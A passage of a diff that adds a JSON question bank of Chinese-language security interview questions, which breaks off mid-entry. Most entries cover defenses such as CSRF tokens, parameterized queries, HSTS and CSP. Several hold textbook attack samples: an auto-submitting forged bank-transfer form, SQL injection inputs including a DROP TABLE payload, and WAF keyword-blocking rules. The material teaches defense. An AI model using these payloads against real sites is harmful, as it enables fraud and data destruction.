@@ -1,0 +1,445 @@
+[
+  {
+    "id": "net-security-002",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是CSRF攻击？如何防御CSRF？",
+    "answer": "## 核心概念\n\nCSRF（Cross-Site Request Forgery，跨站请求伪造）是一种利用用户已登录状态，诱导用户在不知情的情况下执行恶意操作的攻击。\n\n## CSRF攻击原理\n\n```text\n场景: 用户已登录银行网站\n\n1. 用户登录银行网站，获得Cookie\n2. 用户访问恶意网站\n3. 恶意网站页面中有:\n   <img src=\"https://bank.com/transfer?to=hacker&amount=10000\">\n   或\n   <form action=\"https://bank.com/transfer\" method=\"POST\">\n     <input name=\"to\" value=\"hacker\">\n     <input name=\"amount\" value=\"10000\">\n   </form>\n   <script>document.forms[0].submit()</script>\n4. 浏览器自动携带Cookie发送请求\n5. 银行服务器认为是合法请求，执行转账\n```\n\n## CSRF防御措施\n\n### 1. CSRF Token\n```text\n1. 服务器生成随机Token，存入Session\n2. 表单中包含该Token:\n   <input type=\"hidden\" name=\"csrf_token\" value=\"abc123\">\n3. 服务器验证Token:\n   - Token存在且正确: 处理请求\n   - Token不存在或错误: 拒绝请求\n\n攻击者无法获取Token，因此无法伪造请求\n```\n\n### 2. SameSite Cookie\n```text\nSet-Cookie: session=abc; SameSite=Lax\n\n→ 跨站请求不携带Cookie\n→ 从根源防止CSRF\n```\n\n### 3. 验证Referer/Origin\n```text\n检查请求头:\nOrigin: https://evil.com\nReferer: https://evil.com/page\n\n→ 如果不是本站来源，拒绝请求\n```\n\n### 4. 双重Cookie验证\n```text\n1. 前端读取Cookie中的Token\n2. 将Token放入请求参数\n3. 服务器验证Cookie和参数中的Token一致\n\n攻击者无法读取Cookie，因此无法获取Token\n```\n\n## 关键要点\n\n- CSRF利用的是**浏览器自动携带Cookie**的特性\n- CSRF Token是**最常用**的防御方式\n- **SameSite Cookie**是从根源上防御\n- GET请求应该是**幂等且安全**的，不执行敏感操作\n\n## 面试高频追问\n\n1. CSRF和XSS有什么关系？\n2. 为什么SameSite能防止CSRF？\n3. 双重Cookie验证的原理是什么？",
+    "tags": [
+      "CSRF",
+      "跨站请求伪造",
+      "Token"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-003",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是SQL注入？如何防御SQL注入攻击？",
+    "answer": "## 核心概念\n\nSQL注入是一种代码注入攻击，攻击者通过在用户输入中插入恶意SQL代码，欺骗服务器执行非预期的SQL操作。\n\n## SQL注入示例\n\n```text\n正常查询:\nSELECT * FROM users WHERE name = '张三' AND password = '123456'\n\n注入攻击:\n输入: name = ' OR '1'='1\nSQL: SELECT * FROM users WHERE name = '' OR '1'='1' AND password = 'xxx'\n→ 永远为真，绕过登录验证\n\n更危险的注入:\n输入: name = '; DROP TABLE users; --\nSQL: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'\n→ 删除整个表\n```\n\n## SQL注入类型\n\n| 类型 | 说明 |\n|------|------|\n| **数字型注入** | 参数是数字，不需要引号 |\n| **字符型注入** | 参数是字符串，需要闭合引号 |\n| **布尔盲注** | 通过页面返回差异判断 |\n| **时间盲注** | 通过延迟判断 |\n| **联合查询注入** | 使用UNION SELECT |\n| **堆叠查询注入** | 执行多条SQL语句 |\n\n## 防御措施\n\n### 1. 参数化查询（Prepared Statement）\n```java\n// 正确做法（参数化查询）\nString sql = \"SELECT * FROM users WHERE name = ? AND password = ?\";\nPreparedStatement stmt = conn.prepareStatement(sql);\nstmt.setString(1, name);\nstmt.setString(2, password);\n\n// 错误做法（字符串拼接）\nString sql = \"SELECT * FROM users WHERE name = '\" + name + \"'\";\n```\n\n### 2. ORM框架\n```text\n使用ORM框架（如Hibernate、MyBatis）\n→ 自动参数化，防止SQL注入\n```\n\n### 3. 输入验证\n```text\n- 白名单验证\n- 长度限制\n- 特殊字符过滤（不如参数化可靠）\n```\n\n### 4. 最小权限\n```text\n- 数据库用户只授予必要权限\n- 禁止使用root/admin账号\n- 限制执行危险操作\n```\n\n## 关键要点\n\n- **参数化查询**是防御SQL注入的最有效方式\n- **永远不要**拼接SQL字符串\n- 输入验证是**辅助手段**，不能替代参数化\n- ORM框架通常自动防注入，但需注意**原生SQL**的使用\n\n## 面试高频追问\n\n1. 参数化查询为什么能防止SQL注入？\n2. ORM框架一定能防止SQL注入吗？\n3. 如何检测SQL注入漏洞？",
+    "tags": [
+      "SQL注入",
+      "参数化查询",
+      "Web安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-004",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是点击劫持？请说明其攻击原理和 X-Frame-Options 防御方案。",
+    "answer": "## 核心概念\n\n点击劫持是一种视觉欺骗攻击，攻击者通过透明iframe覆盖在诱饵页面上，诱导用户点击隐藏的按钮或链接。\n\n## 攻击原理\n\n```text\n攻击页面结构:\n┌─────────────────────────────┐\n│      诱饵页面 (可见)         │\n│   \"点击领取优惠券\"          │\n│        [诱饵按钮]            │\n│                              │\n│  ┌───────────────────────┐  │\n│  │  目标页面 (透明iframe) │  │\n│  │  \"删除账户\" 按钮       │  │\n│  │  (恰好在诱饵按钮下方)  │  │\n│  └───────────────────────┘  │\n└─────────────────────────────┘\n\n用户以为点击的是\"领取优惠券\"\n实际点击的是\"删除账户\"按钮\n```\n\n## 防御措施\n\n### 1. X-Frame-Options\n```text\nX-Frame-Options: DENY\n→ 完全禁止被iframe嵌入\n\nX-Frame-Options: SAMEORIGIN\n→ 只允许同源页面嵌入\n```\n\n### 2. CSP frame-ancestors\n```text\nContent-Security-Policy: frame-ancestors 'self'\n→ 只允许同源嵌入\n→ 比X-Frame-Options更灵活\n```\n\n### 3. JavaScript防御\n```text\nif (top !== self) {\n    top.location = self.location;\n}\n→ 检测是否被嵌入，如果是则跳出\n```\n\n### 4. 验证码\n```text\n敏感操作前要求输入验证码\n→ 增加攻击难度\n```\n\n## 关键要点\n\n- 点击劫持是**视觉欺骗**，不是技术漏洞\n- **X-Frame-Options**是最简单的防御方式\n- **CSP frame-ancestors**是更现代的替代方案\n- 敏感操作应有**二次确认**机制\n\n## 面试高频追问\n\n1. X-Frame-Options和CSP frame-ancestors有什么区别？\n2. 为什么SAMEORIGIN有时也不安全？\n3. 点击劫持和XSS有什么关系？",
+    "tags": [
+      "点击劫持",
+      "Clickjacking",
+      "X-Frame-Options"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-005",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是中间人攻击（MITM）？有哪些常见的中间人攻击方式？",
+    "answer": "## 核心概念\n\n中间人攻击是指攻击者在通信双方之间秘密拦截、篡改或伪造通信数据的攻击方式。\n\n## 常见中间人攻击方式\n\n### 1. ARP欺骗\n```text\n攻击者发送伪造ARP报文:\n\"网关的MAC是攻击者MAC\"\n→ 受害者流量经过攻击者\n→ 攻击者可以窃听、篡改\n```\n\n### 2. DNS劫持\n```text\n攻击者篡改DNS响应:\nexample.com → 攻击者服务器IP\n→ 用户访问的是伪造网站\n```\n\n### 3. SSL剥离\n```text\n攻击者将HTTPS降级为HTTP:\n用户请求 https://example.com\n攻击者转发 http://example.com 给用户\n→ 用户的通信变成明文\n```\n\n### 4. Wi-Fi窃听\n```text\n恶意Wi-Fi热点:\n用户连接公共Wi-Fi\n→ 所有流量经过攻击者设备\n→ 可以窃听未加密通信\n```\n\n### 5. BGP劫持\n```text\n攻击者伪造BGP路由:\n宣告拥有目标IP段\n→ 流量被路由到攻击者网络\n```\n\n## 防御措施\n\n| 攻击 | 防御 |\n|------|------|\n| ARP欺骗 | 静态ARP绑定、DAI |\n| DNS劫持 | DNSSEC、DoH/DoT |\n| SSL剥离 | HSTS、HSTS预加载 |\n| Wi-Fi窃听 | 使用VPN、避免公共Wi-Fi |\n| BGP劫持 | RPKI、BGPsec |\n\n## 关键要点\n\n- **HTTPS**可以防止大部分MITM攻击\n- **HSTS**可以防止SSL剥离\n- 公共Wi-Fi是MITM的**高风险环境**\n- **证书验证**是HTTPS防MITM的核心\n\n## 面试高频追问\n\n1. HTTPS是如何防止中间人攻击的？\n2. 什么是HSTS？如何部署？\n3. SSL剥离攻击的原理是什么？",
+    "tags": [
+      "中间人攻击",
+      "MITM",
+      "ARP欺骗"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-006",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "HTTPS的工作原理是什么？HTTPS比HTTP安全在哪里？",
+    "answer": "## 核心概念\n\nHTTPS = HTTP + TLS/SSL，在HTTP和TCP之间加入安全层，提供加密、身份验证和完整性保护。\n\n## HTTPS提供的安全保证\n\n| 保证 | 说明 | 防御的攻击 |\n|------|------|-----------|\n| **机密性** | 数据加密传输 | 窃听 |\n| **完整性** | 数据校验，防篡改 | 篡改 |\n| **身份验证** | 证书验证服务器身份 | 冒充 |\n\n## HTTPS握手流程\n\n```text\n1. ClientHello:\n   客户端发送支持的TLS版本、加密套件、随机数\n\n2. ServerHello:\n   服务器选择加密套件，发送随机数\n\n3. Certificate:\n   服务器发送证书（含公钥）\n\n4. ClientKeyExchange:\n   客户端生成预主密钥，用服务器公钥加密后发送\n\n5. ChangeCipherSpec + Finished:\n   双方切换到加密通信，验证握手完整性\n\n6. 加密数据传输:\n   使用对称加密（会话密钥）\n```\n\n## 加密方式\n\n```text\n握手阶段: 非对称加密（RSA/ECDHE）\n→ 交换密钥\n\n数据传输: 对称加密（AES）\n→ 加密数据（性能好）\n```\n\n## 关键要点\n\n- HTTPS的**TLS握手**使用非对称加密\n- **数据传输**使用对称加密（性能考虑）\n- 证书是**身份验证**的核心\n- HTTPS不能防止所有攻击（如XSS、SQL注入）\n\n## 面试高频追问\n\n1. HTTPS握手使用了哪些加密算法？\n2. 为什么数据传输用对称加密而不是非对称加密？\n3. 证书是如何验证的？",
+    "tags": [
+      "HTTPS",
+      "TLS",
+      "加密"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-007",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是证书链？证书是如何验证的？",
+    "answer": "## 核心概念\n\n证书链是从服务器证书到根证书的一系列证书，用于验证服务器证书的真实性。\n\n## 证书链结构\n\n```text\n根证书 (Root CA)\n  ↓ 签发\n中间证书 (Intermediate CA)\n  ↓ 签发\n服务器证书 (Server Certificate)\n\n验证过程:\n服务器证书 ← 中间证书 ← 根证书\n          ↑ 验证签名     ↑ 验证签名     ↑ 信任锚点\n```\n\n## 证书验证流程\n\n```text\n1. 获取服务器证书\n2. 检查证书是否过期\n3. 检查证书域名是否匹配\n4. 验证证书签名（使用签发者公钥）\n5. 沿着证书链向上验证\n6. 直到根证书（浏览器内置信任列表）\n7. 根证书在信任列表中 → 验证通过\n```\n\n## 证书类型\n\n| 类型 | 验证级别 | 价格 | 适用场景 |\n|------|----------|------|----------|\n| **DV** | 域名验证 | 低/免费 | 个人网站 |\n| **OV** | 组织验证 | 中 | 企业网站 |\n| **EV** | 扩展验证 | 高 | 金融/电商 |\n\n## 自签名证书\n```text\n自签名证书:\n- 自己签发，没有CA背书\n- 浏览器不信任，会显示警告\n- 仅适用于测试环境\n```\n\n## 关键要点\n\n- 证书链的**根证书**必须在浏览器/系统的信任列表中\n- **中间证书**由CA签发，用于签发服务器证书\n- 证书验证防止了**伪造证书**的攻击\n- **证书透明度**（CT）日志可以检测恶意证书\n\n## 面试高频追问\n\n1. 为什么需要中间证书？\n2. 什么是证书透明度？\n3. 如果根证书被攻陷会怎样？",
+    "tags": [
+      "证书链",
+      "CA",
+      "TLS"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-008",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "对称加密和非对称加密有什么区别？各自的应用场景是什么？",
+    "answer": "## 核心概念\n\n对称加密使用相同的密钥加密和解密，非对称加密使用一对密钥（公钥加密，私钥解密）。\n\n## 对比\n\n| 对比维度 | 对称加密 | 非对称加密 |\n|----------|----------|------------|\n| 密钥数量 | 一个（共享密钥） | 一对（公钥+私钥） |\n| 加密速度 | 快 | 慢（慢100-1000倍） |\n| 密钥分发 | 困难（需要安全通道） | 容易（公钥可公开） |\n| 适用场景 | 大量数据加密 | 密钥交换、数字签名 |\n| 常见算法 | AES, DES, 3DES | RSA, ECC, DSA |\n\n## 应用场景\n\n### 对称加密\n```text\n- TLS数据传输（AES）\n- 文件加密\n- 数据库加密\n- 磁盘加密（BitLocker）\n```\n\n### 非对称加密\n```text\n- TLS密钥交换（RSA/ECDHE）\n- 数字签名\n- SSH密钥认证\n- HTTPS证书\n```\n\n## HTTPS中的结合使用\n\n```text\nTLS握手（非对称加密）:\n客户端 ←→ 服务器\n  交换密钥（RSA/ECDHE）\n  → 安全地协商对称密钥\n\ndata传输（对称加密）:\n客户端 ←→ 服务器\n  使用对称密钥加密数据\n  → 高效加密大量数据\n\n结合两者优势:\n- 非对称加密解决密钥分发问题\n- 对称加密保证传输效率\n```\n\n## 关键要点\n\n- 对称加密**快但密钥分发困难**\n- 非对称加密**慢但密钥分发简单**\n- 实际应用通常**结合使用**（混合加密）\n- ECC比RSA更高效（更短的密钥提供同等安全性）\n\n## 面试高频追问\n\n1. 为什么HTTPS同时使用两种加密方式？\n2. ECC和RSA有什么区别？\n3. 什么是前向保密（Forward Secrecy）？",
+    "tags": [
+      "对称加密",
+      "非对称加密",
+      "AES",
+      "RSA"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-009",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是数字签名？数字签名的原理是什么？",
+    "answer": "## 核心概念\n\n数字签名是一种用于验证消息完整性和来源的技术，使用非对称加密实现。\n\n## 数字签名原理\n\n```text\n签名过程（发送方）:\n1. 计算消息的哈希值（SHA-256等）\n2. 用私钥加密哈希值 → 数字签名\n3. 将消息和签名一起发送\n\n验证过程（接收方）:\n1. 用发送方公钥解密签名，得到哈希值A\n2. 独立计算消息的哈希值B\n3. 比较A和B:\n   - 相同: 签名有效，消息未被篡改\n   - 不同: 签名无效，消息可能被篡改\n```\n\n## 数字签名的作用\n\n| 作用 | 说明 |\n|------|------|\n| **完整性** | 验证消息未被篡改 |\n| **身份验证** | 确认消息来源 |\n| **不可否认** | 发送方不能否认发送过 |\n\n## 数字签名应用\n\n### 代码签名\n```text\n开发者对代码签名:\n→ 用户验证代码来源\n→ 防止代码被篡改\n→ 操作系统/浏览器验证签名\n```\n\n### SSL/TLS证书\n```text\nCA对证书签名:\n→ 浏览器验证证书真实性\n→ 防止证书伪造\n```\n\n### 电子邮件\n```text\nS/MIME邮件签名:\n→ 验证邮件发送者\n→ 防止邮件篡改\n```\n\n## 关键要点\n\n- 数字签名使用**私钥签名，公钥验证**\n- 签名保证**完整性**和**身份验证**\n- 哈希函数的**抗碰撞性**保证签名安全\n- **私钥泄露**会导致签名失效\n\n## 面试高频追问\n\n1. 数字签名和加密有什么区别？\n2. 为什么需要先哈希再签名？\n3. 什么是数字证书和数字签名的关系？",
+    "tags": [
+      "数字签名",
+      "私钥签名",
+      "完整性"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-010",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是CORS？CORS和同源策略有什么关系？",
+    "answer": "## 核心概念\n\nCORS（Cross-Origin Resource Sharing）是浏览器实现跨域访问的标准机制，是同源策略的例外规则。\n\n## 同源策略\n```text\n同源策略限制:\n- 不同源的页面不能互相访问资源\n- 协议、域名、端口必须完全相同\n\n目的:\n- 防止恶意网站窃取用户数据\n- 保护用户隐私和安全\n```\n\n## CORS如何放松同源策略\n```text\nCORS允许服务器声明:\n\"我允许xxx源访问我的资源\"\n\n响应头:\nAccess-Control-Allow-Origin: https://www.example.com\nAccess-Control-Allow-Methods: GET, POST\nAccess-Control-Allow-Headers: Content-Type\n\n浏览器看到这些头部:\n→ 允许前端代码读取响应\n```\n\n## CORS请求类型\n\n| 类型 | 条件 | 预检 |\n|------|------|------|\n| **简单请求** | GET/HEAD/POST + 特定Content-Type | 不需要 |\n| **非简单请求** | 其他方法或自定义头部 | 需要OPTIONS预检 |\n\n## 关键要点\n\n- CORS是**浏览器**的安全机制\n- 服务器之间**没有**同源策略限制\n- CORS需要**服务器配合**设置响应头\n- CORS**不能防止**所有跨域安全问题\n\n## 面试高频追问\n\n1. CORS和JSONP有什么区别？\n2. 预检请求的作用是什么？\n3. 为什么浏览器要有同源策略？",
+    "tags": [
+      "CORS",
+      "同源策略",
+      "跨域"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-011",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是JWT？JWT的安全性问题有哪些？",
+    "answer": "## 核心概念\n\nJWT（JSON Web Token）是一种基于JSON的开放标准，用于在各方之间安全地传输信息。JWT通常用于身份验证和信息交换。\n\n## JWT结构\n\n```text\nJWT由三部分组成:\n\nHeader.Payload.Signature\n\n1. Header (头部):\n{\"alg\": \"HS256\", \"typ\": \"JWT\"}\nBase64Url编码\n\n2. Payload (负载):\n{\"sub\": \"1234567890\", \"name\": \"张三\", \"iat\": 1516239022}\nBase64Url编码\n\n3. Signature (签名):\nHMACSHA256(\n  base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\n  secret\n)\n```\n\n## JWT安全问题\n\n| 问题 | 说明 | 防御 |\n|------|------|------|\n| **算法混淆** | 攻击者将alg改为none | 验证alg字段 |\n| **密钥泄露** | 签名密钥被窃取 | 使用强密钥，定期轮换 |\n| **令牌泄露** | JWT被截获 | 使用HTTPS，设置过期时间 |\n| **无法撤销** | JWT在过期前一直有效 | 使用黑名单或短过期时间 |\n| **Payload暴露** | Payload只是Base64编码，不是加密 | 不要在Payload放敏感信息 |\n\n## JWT vs Session对比\n\n| 对比维度 | JWT | Session |\n|----------|-----|---------|\n| 存储位置 | 客户端 | 服务器 |\n| 扩展性 | 好（无状态） | 差（需要共享存储） |\n| 安全性 | 中（需要防泄露） | 高 |\n| 撤销能力 | 差 | 好 |\n| 跨域支持 | 好 | 受限 |\n\n## 关键要点\n\n- JWT的Payload是**Base64编码**，不是加密，**不要放敏感信息**\n- JWT应该**设置过期时间**\n- **不要使用`alg: none`**，必须验证算法\n- 敏感操作考虑使用**短期JWT + 刷新机制**\n\n## 面试高频追问\n\n1. JWT和Session有什么区别？各适合什么场景？\n2. JWT为什么无法主动撤销？如何解决？\n3. JWT的签名算法有哪些？如何选择？",
+    "tags": [
+      "JWT",
+      "Token",
+      "身份验证"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-012",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是OAuth 2.0？OAuth 2.0的授权流程是什么？",
+    "answer": "## 核心概念\n\nOAuth 2.0是一种授权框架，允许第三方应用在用户授权下访问用户的资源，而无需获取用户的密码。\n\n## OAuth 2.0角色\n\n| 角色 | 说明 | 示例 |\n|------|------|------|\n| **资源所有者** | 用户 | 微信用户 |\n| **客户端** | 第三方应用 | 第三方网站 |\n| **授权服务器** | 颁发令牌 | 微信授权服务 |\n| **资源服务器** | 存放资源 | 微信API |\n\n## 授权码模式流程\n\n```text\n1. 用户点击\"微信登录\"\n   → 重定向到微信授权页面\n   GET https://wx.qq.com/oauth/authorize?\n     response_type=code&\n     client_id=xxx&\n     redirect_uri=https://example.com/callback&\n     scope=user_info\n\n2. 用户授权\n   → 微信重定向回第三方\n   GET https://example.com/callback?code=AUTH_CODE\n\n3. 第三方用code换token\n   POST https://wx.qq.com/oauth/token\n   grant_type=authorization_code&code=AUTH_CODE&client_secret=xxx\n\n4. 微信返回access_token\n   {\"access_token\": \"xxx\", \"refresh_token\": \"yyy\", \"expires_in\": 7200}\n\n5. 第三方用access_token访问资源\n   GET https://wx.qq.com/api/userinfo\n   Authorization: Bearer access_token\n```\n\n## OAuth 2.0授权模式\n\n| 模式 | 适用场景 | 安全性 |\n|------|----------|--------|\n| **授权码模式** | Web应用（推荐） | 高 |\n| **隐式模式** | 前端SPA（不推荐） | 低 |\n| **密码模式** | 可信客户端 | 中 |\n| **客户端凭证模式** | 机器对机器 | 高 |\n\n## 关键要点\n\n- OAuth 2.0是**授权**框架，不是**认证**协议\n- 授权码模式是**最安全**的模式\n- **OpenID Connect (OIDC)**在OAuth 2.0基础上添加了认证功能\n- access_token应该**短期有效**，refresh_token可以长期\n\n## 面试高频追问\n\n1. OAuth 2.0和OpenID Connect有什么区别？\n2. 为什么推荐授权码模式而不是隐式模式？\n3. access_token和refresh_token有什么区别？",
+    "tags": [
+      "OAuth",
+      "授权",
+      "Token"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-013",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "密码存储的最佳实践是什么？什么是加盐哈希？",
+    "answer": "## 核心概念\n\n密码不应明文存储，应使用加盐哈希（Salted Hash）进行存储，即使数据库泄露也无法直接获取用户密码。\n\n## 错误做法\n\n```text\n1. 明文存储:\n   password = \"123456\"\n   → 数据库泄露，密码直接暴露\n\n2. 简单哈希:\n   hash = SHA256(\"123456\")\n   → 彩虹表攻击可破解\n   → 相同密码产生相同哈希\n```\n\n## 正确做法：加盐哈希\n\n```text\n1. 生成随机盐:\n   salt = random_bytes(16)\n\n2. 拼接密码和盐:\n   salted_password = password + salt\n\n3. 使用安全哈希算法:\n   hash = bcrypt(salted_password)\n   或 hash = PBKDF2(salted_password, iterations)\n   或 hash = scrypt(salted_password, N, r, p)\n\n4. 存储盐和哈希:\n   database.store(username, salt, hash)\n```\n\n## 推荐的哈希算法\n\n| 算法 | 特点 | 推荐度 |\n|------|------|--------|\n| **bcrypt** | 自适应，内置盐 | 推荐 |\n| **PBKDF2** | 可调节迭代次数 | 推荐 |\n| **scrypt** | 内存密集型 | 推荐 |\n| **Argon2** | 最新，抗GPU | 最推荐 |\n| MD5 | 太快，已破解 | 不推荐 |\n| SHA-256 | 太快 | 不推荐 |\n\n## 加盐哈希的优势\n\n| 优势 | 说明 |\n|------|------|\n| 抗彩虹表 | 每个用户的盐不同，无法预计算 |\n| 抗批量破解 | 相同密码产生不同哈希 |\n| 抗暴力破解 | 慢哈希算法增加破解成本 |\n\n## 关键要点\n\n- **永远不要**明文存储密码\n- **不要使用**MD5/SHA-256等快速哈希\n- **bcrypt/Argon2**是推荐的密码哈希算法\n- 每个用户应该有**独立的随机盐**\n\n## 面试高频追问\n\n1. 为什么MD5不适合密码哈希？\n2. bcrypt和Argon2有什么区别？\n3. 迭代次数应该如何设置？",
+    "tags": [
+      "密码存储",
+      "加盐哈希",
+      "bcrypt"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-014",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是DDoS攻击？常见的DDoS攻击类型有哪些？",
+    "answer": "## 核心概念\n\nDDoS（Distributed Denial of Service，分布式拒绝服务攻击）是利用大量受控设备同时向目标发送请求，耗尽目标资源使其无法提供正常服务。\n\n## DDoS攻击类型\n\n### 1. 流量型攻击\n| 攻击 | 说明 |\n|------|------|\n| **UDP Flood** | 发送大量UDP包 |\n| **ICMP Flood** | 发送大量ping包 |\n| **DNS Amplification** | 利用DNS放大流量 |\n| **NTP Amplification** | 利用NTP放大流量 |\n\n### 2. 协议型攻击\n| 攻击 | 说明 |\n|------|------|\n| **SYN Flood** | 发送大量SYN，耗尽半连接队列 |\n| **ACK Flood** | 发送大量ACK包 |\n| **Slowloris** | 慢速连接，耗尽连接资源 |\n\n### 3. 应用层攻击\n| 攻击 | 说明 |\n|------|------|\n| **HTTP Flood** | 发送大量HTTP请求 |\n| **CC攻击** | 针对计算密集型接口 |\n| **Slow POST** | 慢速POST数据 |\n\n## 防御措施\n\n| 措施 | 说明 |\n|------|------|\n| **CDN** | 分散流量 |\n| **WAF** | 过滤恶意请求 |\n| **流量清洗** | 专业DDoS防护服务 |\n| **限流** | 限制单IP请求频率 |\n| **黑名单** | 封禁恶意IP |\n| **SYN Cookie** | 防御SYN Flood |\n\n## 关键要点\n\n- DDoS攻击**难以完全防御**，需要专业防护\n- **CDN和流量清洗**是主要防御手段\n- 应用层DDoS更难防御，需要**智能识别**\n- **放大攻击**利用反射放大流量\n\n## 面试高频追问\n\n1. SYN Flood攻击的原理是什么？\n2. 什么是放大攻击？\n3. 如何区分正常流量和DDoS攻击流量？",
+    "tags": [
+      "DDoS",
+      "拒绝服务",
+      "SYN Flood"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-015",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是WAF（Web应用防火墙）？WAF的作用是什么？",
+    "answer": "## 核心概念\n\nWAF（Web Application Firewall）是专门保护Web应用的安全设备/服务，通过分析HTTP流量来防御各种Web攻击。\n\n## WAF防御的攻击\n\n| 攻击类型 | 说明 |\n|----------|------|\n| **SQL注入** | 检测并阻断SQL注入尝试 |\n| **XSS** | 检测并过滤恶意脚本 |\n| **CSRF** | 验证请求来源 |\n| **文件包含** | 阻止非法文件访问 |\n| **命令注入** | 检测系统命令注入 |\n| **DDoS** | 应用层限流 |\n| **爬虫** | 识别并阻断恶意爬虫 |\n\n## WAF工作模式\n\n```text\n1. 透明代理模式:\n   流量 → WAF → 服务器\n   WAF在中间过滤\n\n2. 反向代理模式:\n   流量 → WAF(反向代理) → 服务器\n   WAF作为入口\n\n3. 云WAF:\n   流量 → CDN/WAF → 源站\n   如Cloudflare、阿里云WAF\n```\n\n## WAF规则示例\n\n```text\n# 检测SQL注入\nif request.uri contains \"union select\" or\n   request.uri contains \"drop table\":\n    block request\n\n# 检测XSS\nif request.uri contains \"<script\" or\n   request.uri contains \"javascript:\":\n    block request\n```\n\n## WAF vs 防火墙\n\n| 对比维度 | 传统防火墙 | WAF |\n|----------|----------|-----|\n| 工作层次 | 网络层/传输层 | 应用层 |\n| 检测内容 | IP/端口/协议 | HTTP请求内容 |\n| 防御对象 | 网络攻击 | Web应用攻击 |\n\n## 关键要点\n\n- WAF是Web应用的**最后一道防线**\n- WAF规则需要**持续更新**以应对新攻击\n- WAF可能产生**误报**，需要调优规则\n- WAF不能替代**代码层面**的安全防护\n\n## 面试高频追问\n\n1. WAF和传统防火墙有什么区别？\n2. WAF的规则是如何工作的？\n3. 云WAF和自建WAF各有什么优缺点？",
+    "tags": [
+      "WAF",
+      "Web应用防火墙",
+      "安全防护"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-016",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是同源策略？同源策略限制了哪些操作？",
+    "answer": "## 核心概念\n\n同源策略（Same-Origin Policy）是浏览器最基本的安全策略，限制来自不同源的脚本读取当前页面的资源。\n\n## 同源定义\n\n```text\n两个URL同源 = 协议 + 域名 + 端口 都相同\n\n同源:\nhttps://example.com/a → https://example.com/b ✓\n\n不同源:\nhttps://example.com vs http://example.com (协议不同) ✗\nhttps://example.com vs https://api.example.com (域名不同) ✗\nhttps://example.com:443 vs https://example.com:8080 (端口不同) ✗\n```\n\n## 同源策略限制\n\n| 操作 | 是否限制 | 说明 |\n|------|----------|------|\n| Cookie读取 | 限制 | 不能读取其他源的Cookie |\n| DOM访问 | 限制 | 不能访问其他源页面的DOM |\n| AJAX请求 | 限制 | 不能读取其他源的响应 |\n| LocalStorage | 限制 | 不能读取其他源的LocalStorage |\n| 资源加载 | 不限制 | 可以加载图片、脚本、CSS |\n| 表单提交 | 不限制 | 可以向其他源提交表单 |\n\n## 不受同源策略限制\n\n```text\n可以跨源的操作:\n\n1. <script src=\"other.com/xxx.js\"> (JSONP利用)\n2. <img src=\"other.com/xxx.png\">\n3. <link rel=\"stylesheet\" href=\"other.com/xxx.css\">\n4. <form action=\"other.com/xxx\" method=\"POST\">\n5. <iframe src=\"other.com/xxx\"> (但不能访问DOM)\n```\n\n## 同源策略的目的\n\n```text\n防止恶意网站:\n- 窃取用户在其他网站的Cookie\n- 读取其他网站的敏感数据\n- 操纵其他网站的DOM\n```\n\n## 关键要点\n\n- 同源策略是**浏览器**的安全限制\n- 服务器之间**没有**同源策略\n- **CORS**是放松同源策略的标准机制\n- JSONP利用**script标签不受同源限制**的特性\n\n## 面试高频追问\n\n1. 为什么img标签可以跨域加载图片？\n2. CORS是如何放松同源策略的？\n3. 同源策略有什么局限性？",
+    "tags": [
+      "同源策略",
+      "浏览器安全",
+      "跨域"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-017",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是CSP（Content Security Policy）？CSP如何防止XSS？",
+    "answer": "## 核心概念\n\nCSP是一种安全机制，通过定义页面可以加载哪些资源来防止XSS等代码注入攻击。\n\n## CSP防止XSS的原理\n\n```text\nXSS攻击: 注入恶意脚本\n\nCSP防御:\n1. 限制脚本来源:\n   Content-Security-Policy: script-src 'self' cdn.example.com\n   → 只允许从自身和CDN加载脚本\n   → 注入的内联脚本不会执行\n\n2. 禁止内联脚本:\n   script-src 'self'\n   → 禁止<script>标签中的内联代码\n   → 禁止javascript: URL\n   → 禁止onerror等事件处理器\n\n3. 使用nonce:\n   script-src 'nonce-abc123'\n   → 只有带正确nonce的脚本可以执行\n```\n\n## CSP配置示例\n\n```text\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' https://cdn.example.com 'nonce-abc123';\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data: https:;\n  connect-src 'self' api.example.com;\n  frame-ancestors 'self';\n```\n\n## CSP指令\n\n| 指令 | 限制内容 |\n|------|----------|\n| **script-src** | JavaScript来源 |\n| **style-src** | CSS来源 |\n| **img-src** | 图片来源 |\n| **connect-src** | AJAX/WebSocket来源 |\n| **frame-ancestors** | iframe嵌入 |\n| **base-uri** | base标签 |\n| 